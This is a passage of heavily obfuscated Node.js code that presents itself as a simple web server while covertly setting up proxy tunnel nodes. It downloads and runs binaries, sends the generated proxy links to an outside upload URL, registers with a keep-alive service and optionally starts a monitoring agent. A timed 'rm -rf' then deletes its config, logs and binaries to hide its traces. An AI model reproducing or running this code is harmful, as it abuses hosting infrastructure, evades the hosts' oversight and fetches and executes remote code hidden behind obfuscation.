axios[_0x229bfd(_0x1ff23c._0xb9226b)](_0x229bfd(0xb9),{'timeout':0xbb8});if(_0xe33480[_0x229bfd(_0x1ff23c._0x370a52)]&&_0xe33480[_0x229bfd(_0x1ff23c._0x2b5449)]['status']===_0x229bfd(_0x1ff23c._0x59b3c7)&&_0xe33480[_0x229bfd(0xaa)]['countryCode']&&_0xe33480[_0x229bfd(0xaa)][_0x229bfd(_0x1ff23c._0x250899)])return _0xe33480['data'][_0x229bfd(_0x1ff23c._0xb59128)]+'_'+_0xe33480[_0x229bfd(_0x1ff23c._0x2b5449)]['org'];}catch(_0x87f55c){}}return'Unknown';}async function _0x4822bb(_0x1b00de){const _0x5baf96=await _0x59a97d(),_0x3955f1=NAME?NAME+'-'+_0x5baf96:_0x5baf96;return new Promise(_0x2d036a=>{const _0x446239={_0x29ec5e:0xb7,_0x4e03e2:0xda,_0x3dccee:0xeb,_0x3a650b:0xab,_0x63914:0x100,_0x19ba9b:0xe1,_0x345823:0x12d,_0x4c493b:0x10e,_0x99e73e:0xb2,_0xf211a7:0x85,_0x23e4e4:0x118,_0x1a729a:0xf0,_0x5187b2:0x118,_0x5a8dab:0x10b},_0x29d30a={_0x119c0a:0x7c};setTimeout(()=>{const _0x3caa5d=_0x1d9d,_0x21187b={'v':'2','ps':''+_0x3955f1,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3caa5d(_0x446239._0x29ec5e),'net':'ws','type':'none','host':_0x1b00de,'path':_0x3caa5d(_0x446239._0x4e03e2),'tls':'tls','sni':_0x1b00de,'alpn':'','fp':_0x3caa5d(_0x446239._0x3dccee)},_0x5a3deb=_0x3caa5d(0xe4)+UUID+'@'+CFIP+':'+CFPORT+_0x3caa5d(_0x446239._0x3a650b)+_0x1b00de+_0x3caa5d(0xfa)+_0x1b00de+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x3955f1+_0x3caa5d(_0x446239._0x63914)+Buffer[_0x3caa5d(0xf0)](JSON[_0x3caa5d(0xa8)](_0x21187b))[_0x3caa5d(_0x446239._0x19ba9b)]('base64')+_0x3caa5d(_0x446239._0x345823)+UUID+'@'+CFIP+':'+CFPORT+_0x3caa5d(_0x446239._0x4c493b)+_0x1b00de+'&fp=firefox&type=ws&host='+_0x1b00de+_0x3caa5d(0x107)+_0x3955f1+_0x3caa5d(_0x446239._0x99e73e);console[_0x3caa5d(_0x446239._0xf211a7)](Buffer[_0x3caa5d(0xf0)](_0x5a3deb)['toString'](_0x3caa5d(_0x446239._0x23e4e4))),fs[_0x3caa5d(0x7d)](subPath,Buffer[_0x3caa5d(_0x446239._0x1a729a)](_0x5a3deb)[_0x3caa5d(_0x446239._0x19ba9b)](_0x3caa5d(_0x446239._0x5187b2))),console[_0x3caa5d(_0x446239._0xf211a7)](FILE_PATH+_0x3caa5d(0xbc)),uploadNodes(),app[_0x3caa5d(_0x446239._0x5a8dab)]('/'+SUB_PATH,(_0x2ca580,_0x1a54dd)=>{const _0x4c9b4f=_0x3caa5d,_0x367f0f=Buffer['from'](_0x5a3deb)['toString']('base64');_0x1a54dd[_0x4c9b4f(0x13a)]('Content-Type',_0x4c9b4f(_0x29d30a._0x119c0a)),_0x1a54dd['send'](_0x367f0f);}),_0x2d036a(_0x5a3deb);},0x7d0);});}}async function uploadNodes(){const _0x16f6f4={_0x1cef98:0x8f,_0x133144:0x12f,_0x45dac6:0xbe,_0x1532ee:0xcb,_0x2f79a0:0xff,_0x22b5eb:0xba,_0x25a2a7:0xb1,_0x3498f4:0x121,_0x236fd7:0x12b},_0x551b15=_0x53eef8;if(UPLOAD_URL&&PROJECT_URL){const _0x579735=PROJECT_URL+'/'+SUB_PATH,_0x2042d5={'subscription':[_0x579735]};try{const _0x294c50=await axios[_0x551b15(0xb1)](UPLOAD_URL+'/api/add-subscriptions',_0x2042d5,{'headers':{'Content-Type':_0x551b15(_0x16f6f4._0x1cef98)}});return _0x294c50&&_0x294c50[_0x551b15(0xf2)]===0xc8?(console[_0x551b15(0x85)](_0x551b15(_0x16f6f4._0x133144)),_0x294c50):null;}catch(_0x4e25fb){if(_0x4e25fb[_0x551b15(_0x16f6f4._0x45dac6)]){if(_0x4e25fb['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x1564b9=fs[_0x551b15(_0x16f6f4._0x1532ee)](listPath,'utf-8'),_0x3c9f9d=_0x1564b9[_0x551b15(_0x16f6f4._0x2f79a0)]('\x0a')[_0x551b15(0xf9)](_0x830df1=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x551b15(0xea)](_0x830df1));if(_0x3c9f9d[_0x551b15(_0x16f6f4._0x22b5eb)]===0x0)return;const _0x188a9f=JSON[_0x551b15(0xa8)]({'nodes':_0x3c9f9d});try{const _0x2f6f04=await axios[_0x551b15(_0x16f6f4._0x25a2a7)](UPLOAD_URL+_0x551b15(_0x16f6f4._0x3498f4),_0x188a9f,{'headers':{'Content-Type':_0x551b15(_0x16f6f4._0x1cef98)}});return _0x2f6f04&&_0x2f6f04['status']===0xc8?(console['log'](_0x551b15(_0x16f6f4._0x236fd7)),_0x2f6f04):null;}catch(_0x4a14e9){return null;}}else return;}}function cleanFiles(){const _0x38b49d={_0x5e4170:0x145,_0x5eeb02:0xf3},_0x2d7c0e={_0x2617ea:0x83,_0x4e727d:0x85,_0x665ead:0x141};setTimeout(()=>{const _0x4a0bec={_0x32e36f:0x83,_0x1822c9:0x134,_0x27f6f6:0x141},_0x49ce70=_0x1d9d,_0x569372=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x569372[_0x49ce70(0x80)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x569372[_0x49ce70(0x80)](phpPath);process[_0x49ce70(0xad)]===_0x49ce70(0xbf)?exec(_0x49ce70(0x129)+_0x569372[_0x49ce70(0xfb)]('\x20')+_0x49ce70(_0x38b49d._0x5e4170),_0x43fb85=>{const _0x3ff455=_0x49ce70;console[_0x3ff455(_0x4a0bec._0x32e36f)](),console['log'](_0x3ff455(_0x4a0bec._0x1822c9)),console['log'](_0x3ff455(_0x4a0bec._0x27f6f6));}):exec('rm\x20-rf\x20'+_0x569372['join']('\x20')+_0x49ce70(_0x38b49d._0x5eeb02),_0x5acb50=>{const _0x7c791c=_0x49ce70;console[_0x7c791c(_0x2d7c0e._0x2617ea)](),console[_0x7c791c(0x85)](_0x7c791c(0x134)),console[_0x7c791c(_0x2d7c0e._0x4e727d)](_0x7c791c(_0x2d7c0e._0x665ead));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5894cc={_0x47c2d7:0x85,_0x1eb1b3:0x12c,_0x4d5598:0x138},_0x4ac4cb=_0x53eef8;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4ac4cb(_0x5894cc._0x47c2d7)](_0x4ac4cb(0x11d));return;}try{const _0x3ad40b=await axios[_0x4ac4cb(0xb1)](_0x4ac4cb(0xdf),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4ac4cb(0x8f)}});return console['log'](_0x4ac4cb(0x106)),_0x3ad40b;}catch(_0x5b1463){return console[_0x4ac4cb(_0x5894cc._0x1eb1b3)](_0x4ac4cb(_0x5894cc._0x4d5598)+_0x5b1463['message']),null;}}async function startserver(){const _0x4099c7={_0x1dbf74:0x12c,_0xbc05b1:0x132},_0x3f8eb7=_0x53eef8;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1f3dc8){console[_0x3f8eb7(_0x4099c7._0x1dbf74)](_0x3f8eb7(_0x4099c7._0xbc05b1),_0x1f3dc8);}}startserver()['catch'](_0x36917d=>{const _0x59a3f4={_0x1ffa13:0x12c,_0x33a328:0x133},_0x309c67=_0x53eef8;console[_0x309c67(_0x59a3f4._0x1ffa13)](_0x309c67(_0x59a3f4._0x33a328),_0x36917d);}),app[_0x53eef8(0x10b)]('/',async function(_0x461e3,_0xfa0ab8){const _0x334e91={_0x895a3d:0xfb,_0x11c0e5:0xcd,_0x517029:0x9f,_0x4dc96b:0x9c},_0x587348=_0x53eef8;try{const _0x1e11c2=path[_0x587348(_0x334e91._0x895a3d)](__dirname,'index.html'),_0x504ec2=await fs[_0x587348(0xc8)]['readFile'](_0x1e11c2,_0x587348(_0x334e91._0x11c0e5));_0xfa0ab8[_0x587348(_0x334e91._0x517029)](_0x504ec2);}catch(_0x5c5e23){_0xfa0ab8[_0x587348(_0x334e91._0x517029)](_0x587348(_0x334e91._0x4dc96b));}}),app[_0x53eef8(0x123)](PORT,()=>console[_0x53eef8(0x85)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
